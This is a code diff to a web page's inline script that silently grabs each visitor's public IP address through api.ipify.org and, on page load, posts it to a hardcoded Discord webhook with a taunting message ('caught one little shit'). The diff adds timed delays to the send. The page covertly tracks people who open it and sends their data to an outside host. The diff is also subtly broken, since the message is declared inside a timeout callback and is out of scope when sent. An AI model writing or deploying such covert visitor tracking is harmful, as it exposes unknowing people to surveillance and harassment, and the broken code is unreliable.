@@ -5,13 +5,16 @@
 const webhookUrl = "https://discord.com/api/webhooks/1210975688002240613/MfdO7_ih-VtdQZGv0D-Dt_3jvvT1UgDok1-j0q31xyVCDAC8jaaLEk5wByC-e443SrNa";
 fetch('https://api.ipify.org/')  .then(response => response.text())  .then(script => ip = script);
 // Replace with your desired message content
+      setTimeout(function(){
 const message = {
     content: "caught one little shit " + ip,
     // Add embeds or attachments if needed
 };
+      },4000)
 
 // Replace with your desired trigger (e.g., page load)
 window.onload = function() {
+  setTimeout(function(){
     fetch(webhookUrl, {
         method: "POST",
         body: JSON.stringify(message),
@@ -21,6 +24,7 @@ window.onload = function() {
     })
     .then(() => console.log("Message sent to Discord webhook"))
     .catch(error => console.error("Error sending message:", error));
+  },4010)
 };
     </script>
   </body>
